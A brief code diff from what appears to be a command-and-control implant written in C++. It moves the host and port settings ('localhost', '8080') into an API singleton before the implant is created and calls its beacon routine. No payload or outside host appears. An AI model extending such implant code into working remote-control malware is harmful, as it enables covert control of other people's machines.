@@ -6,7 +6,10 @@ int main(int argc, char* argv[]){
     const auto host = "localhost";
     const auto port = "8080";
 
-    std::unique_ptr implant = std::make_unique<Implant>(host, port);
+    // Setup the API Singleton
+    Api::setup(host, port);
+
+    std::unique_ptr implant = std::make_unique<Implant>();
 
     try {
         implant->beacon();
